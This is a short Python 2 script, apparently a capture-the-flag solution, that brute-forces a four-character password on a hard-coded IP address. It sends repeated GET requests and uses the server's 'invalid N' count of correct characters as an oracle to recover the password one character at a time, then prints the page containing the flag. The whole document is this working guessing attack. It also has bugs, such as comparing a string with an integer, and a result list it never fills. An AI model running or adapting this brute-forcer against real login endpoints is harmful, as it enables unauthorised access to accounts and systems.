import requests
import string

def main():
    # http://128.199.96.39/
    result = []
    t = "0"
    tmp = ""
    while True:
        for s in string.ascii_uppercase+string.ascii_letters+string.digits:
            if t == "0":
                params = s+"BCD"
            elif t == "1":
                params = tmp+s+"CD"
            elif t == "2":
                params = tmp+s+"D"
            elif t == "3":
                params = tmp+s
            print params
            res = requests.get("http://128.199.96.39/?password="+params).content
            if "flag{" in res:
                print res
            res = res[:10].replace("\n", "").replace("invalid ", "")
            if res != t:
                if res > len(tmp):
                    t = res
                    tmp += s
                    break
        if len(tmp) == 4:
            break
    print result
if __name__ == '__main__':
    main()